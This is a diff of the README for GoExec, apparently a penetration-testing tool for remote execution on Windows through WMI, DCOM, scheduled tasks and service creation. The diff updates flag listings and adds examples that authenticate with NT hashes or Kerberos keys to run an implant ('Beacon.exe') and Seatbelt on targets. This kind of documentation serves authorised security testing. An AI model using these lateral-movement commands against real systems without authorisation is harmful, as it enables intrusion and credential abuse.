@@ -44,11 +44,11 @@ We've provided a Dockerfile to build and run GoExec within Docker containers.
 git clone https://github.com/FalconOpsLLC/goexec
 cd goexec
 
-# Build goexec image
+# Build goexec image (as root/docker group)
 docker build . --tag goexec --network host
 
 # Run goexec via Docker container
-alias goexec='docker run -it --rm --name goexec goexec'
+alias goexec='sudo docker run -it --rm goexec'
 goexec -h # display help menu
 ```
 
@@ -94,7 +94,10 @@ Authentication:
 
 ### Fetching Remote Process Output
 
-Although not recommended for live engagements or monitored environments due to OPSEC concerns, we've included the optional ability to fetch program output via SMB file transfer with the `-o` flag. Use of this flag will wrap the supplied command in `cmd.exe /c ... > \Windows\Temp\RANDOM` where `RANDOM` is a random GUID, then fetch the output file via SMB file transfer.
+Although not recommended for live engagements or monitored environments due to OPSEC concerns, we've included the optional ability to fetch program output via SMB file transfer with the `-o`/`--output` flag.
+Use of this flag will wrap the supplied command in `cmd.exe /c ... > \Windows\Temp\RANDOM` where `RANDOM` is a random GUID, then fetch the output file via SMB file transfer.
+By default, the output collection will time out after 1 minute, but this can be adjusted with the `--out-timeout` flag.
+
 
 ### WMI Module (`wmi`)
 
@@ -112,13 +115,11 @@ Available Commands:
 
 Network:
   -x, --proxy URI           Proxy URI
-  -F, --epm-filter string   String binding to filter endpoints returned
-                            by the RPC endpoint mapper (EPM)
+  -F, --epm-filter string   String binding to filter endpoints returned by the RPC endpoint mapper (EPM)
       --endpoint string     Explicit RPC endpoint definition
-      --no-epm              Do not use EPM to automatically detect RPC
-                            endpoints
+      --epm                 Use EPM to discover available bindings
       --no-sign             Disable signing on DCERPC messages
-      --no-seal             Disable packet stub encryption on DCERPC messages
+      --no-seal             Disable packet stub encryption on DCERPC message
 ```
 
 #### Process Creation Method (`wmi proc`)
@@ -209,14 +210,12 @@ Available Commands:
 ... [inherited flags] ...
 
 Network:
-  -x, --proxy URI           Proxy URI
-  -F, --epm-filter string   String binding to filter endpoints returned
-                            by the RPC endpoint mapper (EPM)
-      --endpoint string     Explicit RPC endpoint definition
-      --no-epm              Do not use EPM to automatically detect RPC
-                            endpoints
-      --no-sign             Disable signing on DCERPC messages
-      --no-seal             Disable packet stub encryption on DCERPC messages
+  -x, --proxy URI            Proxy URI
+  -F, --epm-filter binding   String binding to filter endpoints returned by the RPC endpoint mapper (EPM)
+      --endpoint binding     Explicit RPC endpoint string binding
+      --epm                  Use EPM to discover available bindings
+      --no-sign              Disable signing on DCERPC messages
+      --no-seal              Disable packet stub encryption on DCERPC messages
 ```
 
 #### `MMC20.Application` Method (`dcom mmc`)
@@ -228,16 +227,15 @@ Usage:
   goexec dcom mmc [target] [flags]
 
 Execution:
-  -e, --exec string           Remote Windows executable to invoke
-  -a, --args string           Process command line arguments
-  -c, --command string        Windows process command line (executable &
-                              arguments)
-  -o, --out string            Fetch execution output to file or "-" for
-                              standard output
-  -m, --out-method string     Method to fetch execution output (default "smb")
-      --no-delete-out         Preserve output file on remote filesystem
-      --directory directory   Working directory (default "C:\\")
-      --window string         Window state (default "Minimized")
+  -e, --exec string            Remote Windows executable to invoke
+  -a, --args string            Process command line arguments
+  -c, --command string         Windows process command line (executable & arguments)
+  -o, --out file               Fetch execution output to file or "-" for standard output
+  -m, --out-method Method      Method to fetch execution output (default "smb")
+      --out-timeout duration   Output timeout duration (default 1m0s)
+      --no-delete-out          Preserve output file on remote filesystem
+      --directory directory    Working directory (default "C:\\")
+      --window string          Window state (default "Minimized"
 
 ... [inherited flags] ...
 ```
@@ -267,14 +265,15 @@ Usage:
   goexec dcom shellwindows [target] [flags]
 
 Execution:
-  -e, --exec string           Remote Windows executable to invoke
-  -a, --args string           Process command line arguments
-  -c, --command string        Windows process command line (executable & arguments)
-  -o, --out string            Fetch execution output to file or "-" for standard output
-  -m, --out-method string     Method to fetch execution output (default "smb")
-      --no-delete-out         Preserve output file on remote filesystem
-      --directory directory   Working directory (default "C:\\")
-      --app-window ID         Application window state ID (default "0")
+  -e, --exec executable        Remote Windows executable to invoke
+  -a, --args string            Process command line arguments
+  -c, --command string         Windows process command line (executable & arguments)
+  -o, --out file               Fetch execution output to file or "-" for standard output
+  -m, --out-method string      Method to fetch execution output (default "smb")
+      --out-timeout duration   Output timeout duration (default 1m0s)
+      --no-delete-out          Preserve output file on remote filesystem
+      --directory directory    Working directory (default "C:\\")
+      --app-window ID          Application window state ID (default "0")
 
 ... [inherited flags] ...
 ```
@@ -310,14 +309,15 @@ Usage:
   goexec dcom shellbrowserwindow [target] [flags]
 
 Execution:
-  -e, --exec string           Remote Windows executable to invoke
-  -a, --args string           Process command line arguments
-  -c, --command string        Windows process command line (executable & arguments)
-  -o, --out string            Fetch execution output to file or "-" for standard output
-  -m, --out-method string     Method to fetch execution output (default "smb")
-      --no-delete-out         Preserve output file on remote filesystem
-      --directory directory   Working directory (default "C:\\")
-      --app-window ID         Application window state ID (default "0")
+  -e, --exec executable        Remote Windows executable to invoke
+  -a, --args string            Process command line arguments
+  -c, --command string         Windows process command line (executable & arguments)
+  -o, --out file               Fetch execution output to file or "-" for standard output
+  -m, --out-method string      Method to fetch execution output (default "smb")
+      --out-timeout duration   Output timeout duration (default 1m0s)
+      --no-delete-out          Preserve output file on remote filesystem
+      --directory directory    Working directory (default "C:\\")
+      --app-window ID          Application window state ID (default "0"
 
 ... [inherited flags] ...
 ```
@@ -349,18 +349,19 @@ Available Commands:
 ... [inherited flags] ...
 
 Network:
-  -x, --proxy URI           Proxy URI
-  -F, --epm-filter string   String binding to filter endpoints returned by the RPC endpoint mapper (EPM)
-      --endpoint string     Explicit RPC endpoint definition
-      --no-epm              Do not use EPM to automatically detect RPC endpoints
-      --no-sign             Disable signing on DCERPC messages
-      --no-seal             Disable packet stub encryption on DCERPC messages
+  -x, --proxy URI            Proxy URI
+  -F, --epm-filter binding   String binding to filter endpoints returned by the RPC endpoint mapper (EPM)
+      --endpoint binding     Explicit RPC endpoint string binding
+      --epm                  Use EPM to discover available bindings
+      --no-sign              Disable signing on DCERPC messages
+      --no-seal              Disable packet stub encryption on DCERPC messages
 ```
 
 #### Create Scheduled Task (`tsch create`)
 
 
 The `create` method registers a scheduled task using [SchRpcRegisterTask](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/849c131a-64e4-46ef-b015-9d4c599c5167) with an automatic start time via [TimeTrigger](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/385126bf-ed3a-4131-8d51-d88b9c00cfe9), and optional automatic deletion with the [DeleteExpiredTaskAfter](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/6bfde6fe-440e-4ddd-b4d6-c8fc0bc06fae) setting.
+The stability of this method is heavily reliant on the target device having a correctly synced date/time, but this can be adjusted with the `--delay-stop` and `--start-delay` flags.
 
 ```text
 Usage:
@@ -375,12 +376,13 @@ Task Scheduler:
       --sid SID                User SID to impersonate (default "S-1-5-18")
 
 Execution:
-  -e, --exec string         Remote Windows executable to invoke
-  -a, --args string         Process command line arguments
-  -c, --command string      Windows process command line (executable & arguments)
-  -o, --out string          Fetch execution output to file or "-" for standard output
-  -m, --out-method string   Method to fetch execution output (default "smb")
-      --no-delete-out       Preserve output file on remote filesystem
+  -e, --exec executable        Remote Windows executable to invoke
+  -a, --args string            Process command line arguments
+  -c, --command string         Windows process command line (executable & arguments)
+  -o, --out file               Fetch execution output to file or "-" for standard output
+  -m, --out-method string      Method to fetch execution output (default "smb")
+      --out-timeout duration   Output timeout duration (default 1m0s)
+      --no-delete-out          Preserve output file on remote filesystem
 
 ... [inherited flags] ...
 ```
@@ -388,7 +390,9 @@ Execution:
 ##### Examples
 
 ```shell
-# Authenticate with NT hash via Kerberos, register task at \Microsoft\Windows\GoExec, execute `C:\Windows\Temp\Beacon.exe`
+# Authenticate with NT hash via Kerberos, 
+#   register task at \Microsoft\Windows\GoExec,
+#   execute `C:\Windows\Temp\Beacon.exe`
 ./goexec tsch create "$target" \
   --user "${auth_user}@${domain}" \
   --nt-hash "$auth_nt" \
@@ -396,6 +400,17 @@ Execution:
   --kerberos \
   --task '\Microsoft\Windows\GoExec' \
   --exec 'C:\Windows\Temp\Beacon.exe'
+
+# Authenticate using Kerberos AES key,
+#   execute `C:\Windows\Temp\Seatbelt.exe -group=system`,
+#   collect output with lengthened (5 minute) timeout
+./goexec tsch create "$target" \
+  --user "${auth_user}@${domain}" \
+  --dc "$dc_ip" \
+  --aes-key "$auth_aes" \
+  --command 'C:\Windows\Temp\Seatbelt.exe -group=system' \
+  --out ./seatbelt.out \
+  --out-timeout 5m
 ```
 
 #### Create Scheduled Task & Demand Start (`tsch demand`)
@@ -407,20 +422,19 @@ Usage:
   goexec tsch demand [target] [flags]
 
 Task Scheduler:
-  -t, --task string      Name or path of the new task
-      --session uint32   Hijack existing session given the session ID
-      --sid string       User SID to impersonate (default "S-1-5-18")
-      --no-delete        Don't delete task after execution
+  -t, --task string   Name or path of the new task
+      --session ID    Hijack existing session given the session ID
+      --sid SID       User SID to impersonate (default "S-1-5-18")
+      --no-delete     Don't delete task after execution
 
 Execution:
-  -e, --exec string         Remote Windows executable to invoke
-  -a, --args string         Process command line arguments
-  -c, --command string      Windows process command line (executable & arguments)
-  -o, --out string          Fetch execution output to file or "-" for standard output
-  -m, --out-method string   Method to fetch execution output (default "smb")
-      --no-delete-out       Preserve output file on remote filesystem
-
-... [inherited flags] ...
+  -e, --exec executable        Remote Windows executable to invoke
+  -a, --args string            Process command line arguments
+  -c, --command string         Windows process command line (executable & arguments)
+  -o, --out file               Fetch execution output to file or "-" for standard output
+  -m, --out-method string      Method to fetch execution output (default "smb")
+      --out-timeout duration   Output timeout duration (default 1m0s)
+      --no-delete-out          Preserve output file on remote filesystem
 ```
 
 ##### Examples
@@ -462,12 +476,13 @@ Task Scheduler:
       --no-revert     Don't restore the original task definition
 
 Execution:
-  -e, --exec string         Remote Windows executable to invoke
-  -a, --args string         Process command line arguments
-  -c, --command string      Windows process command line (executable & arguments)
-  -o, --out string          Fetch execution output to file or "-" for standard output
-  -m, --out-method string   Method to fetch execution output (default "smb")
-      --no-delete-out       Preserve output file on remote filesystem
+  -e, --exec executable        Remote Windows executable to invoke
+  -a, --args string            Process command line arguments
+  -c, --command string         Windows process command line (executable & arguments)
+  -o, --out file               Fetch execution output to file or "-" for standard output
+  -m, --out-method string      Method to fetch execution output (default "smb")
+      --out-timeout duration   Output timeout duration (default 1m0s)
+      --no-delete-out          Preserve output file on remote filesystem
 
 ... [inherited flags] ...
 ```
@@ -504,12 +519,12 @@ Available Commands:
 ... [inherited flags] ...
 
 Network:
-  -x, --proxy URI           Proxy URI
-  -F, --epm-filter string   String binding to filter endpoints returned by the RPC endpoint mapper (EPM)
-      --endpoint string     Explicit RPC endpoint definition
-      --no-epm              Do not use EPM to automatically detect RPC endpoints
-      --no-sign             Disable signing on DCERPC messages
-      --no-seal             Disable packet stub encryption on DCERPC messages
+  -x, --proxy URI            Proxy URI
+  -F, --epm-filter binding   String binding to filter endpoints returned by the RPC endpoint mapper (EPM)
+      --endpoint binding     Explicit RPC endpoint string binding
+      --epm                  Use EPM to discover available bindings
+      --no-sign              Disable signing on DCERPC messages
+      --no-seal              Disable packet stub encryption on DCERPC messages
 ```
 
 #### Create Service (`scmr create`)
@@ -537,20 +552,20 @@ Service:
 
 ```shell
 # Use MSRPC instead of SMB, use custom service name, execute `cmd.exe`
-./goexec scmr create "$target" \
+goexec scmr create "$target" \
   -u "${auth_user}@${domain}" \
   -p "$auth_pass" \
   -f 'C:\Windows\System32\cmd.exe' \
-  -F 'ncacn_ip_tcp:'
+  --epm -F 'ncacn_ip_tcp:'
 
 # Directly dial svcctl named pipe ("ncacn_np:[svcctl]"),
 #   use random service name,
 #   execute `C:\Windows\System32\calc.exe` 
-./goexec scmr create "$target" \
+goexec scmr create "$target" \
   -u "${auth_user}@${domain}" \
   -p "$auth_pass" \
   -f 'C:\Windows\System32\calc.exe' \
-  --endpoint 'ncacn_np:[svcctl]' --no-epm
+  --endpoint 'ncacn_np:[svcctl]'
 ```
 
 #### Modify Service (`scmr change`)
